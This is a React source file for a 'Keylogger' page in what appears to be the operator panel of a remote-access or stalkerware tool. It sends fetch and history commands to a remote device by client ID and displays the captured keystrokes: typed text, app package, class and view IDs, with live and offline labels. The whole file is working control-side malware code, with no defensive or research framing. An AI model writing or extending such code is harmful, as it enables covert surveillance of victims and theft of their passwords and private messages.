import { useCallback } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, KeystrokeEntry } from '@/types';
import { CMD, normalizeKeystrokeList, extractList } from '@/types';
import { DevicePageHeader, EmptyState, ErrorAlert, LoadingSkeleton } from '@/components/device/shared';
import { Card, CardContent } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Keyboard, Download } from 'lucide-react';

export default function KeyloggerPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();

  const { data: keystrokes, loading, error, refresh, sendCommand, commandStatus } = useDeviceData<KeystrokeEntry[]>({
    clientId,
    page: 'keylogger',
    extractData: (d) => normalizeKeystrokeList(extractList(d.list)),
    dataType: 'keylogger',
    defaultValue: [],
  });

  const fetchKeylogger = useCallback(async () => {
    await sendCommand(CMD.KEYLOGGER, { action: 'fetch' });
  }, [sendCommand]);

  const getHistory = useCallback(async () => {
    await sendCommand(CMD.KEYLOGGER, { action: 'getHistory' });
  }, [sendCommand]);

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Keylogger"
        subtitle={`${keystrokes.length} events`}
        actions={[
          { label: 'Fetch', icon: Download, onClick: fetchKeylogger, disabled: loading || !online },
          { label: 'Get History', icon: Keyboard, onClick: getHistory, disabled: loading || !online, variant: 'outline' },
        ]}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {error && <ErrorAlert message={error} onRetry={refresh} />}

      {loading && !error ? (
        <LoadingSkeleton rows={4} />
      ) : keystrokes.length === 0 ? (
        <EmptyState
          icon={Keyboard}
          title="No keystroke data"
          description="Click Fetch to retrieve buffered keystrokes, or Get History for stored data"
          action={{ label: 'Fetch Keystrokes', onClick: fetchKeylogger, disabled: loading || !online, loading: commandStatus === 'sending' }}
        />
      ) : (
        <div className="space-y-2">
          {keystrokes.map((item, i) => (
            <Card key={`ks-${item.timestamp}-${i}`} className="shadow-none">
              <CardContent className="p-3">
                <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                  <Badge variant="outline" className={`text-[9px] px-1 py-0 ${item.type === 'offline' ? 'border-blue-400/30 text-blue-500' : 'border-green-400/30 text-green-500'}`}>
                    {item.type === 'offline' ? 'OFFLINE' : 'LIVE'}
                  </Badge>
                  {item.eventType && (
                    <Badge variant="secondary" className="text-[9px] px-1 py-0">{item.eventType}</Badge>
                  )}
                  <span className="text-[10px] text-muted-foreground">{item.timestamp}</span>
                </div>
                {item.pkg && <p className="text-[10px] font-mono text-muted-foreground truncate">pkg: {item.pkg}</p>}
                {item.cls && <p className="text-[10px] font-mono text-muted-foreground truncate">cls: {item.cls}</p>}
                {item.viewId && <p className="text-[10px] font-mono text-muted-foreground truncate">viewId: {item.viewId}</p>}
                {(item.text || item.content) && (
                  <p className="font-mono text-xs break-all bg-muted/50 rounded p-2 mt-1">
                    {item.text || item.content}
                  </p>
                )}
                {item.extra && (
                  <p className="text-[9px] font-mono text-muted-foreground/60 break-all mt-0.5">extra: {item.extra}</p>
                )}
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
}
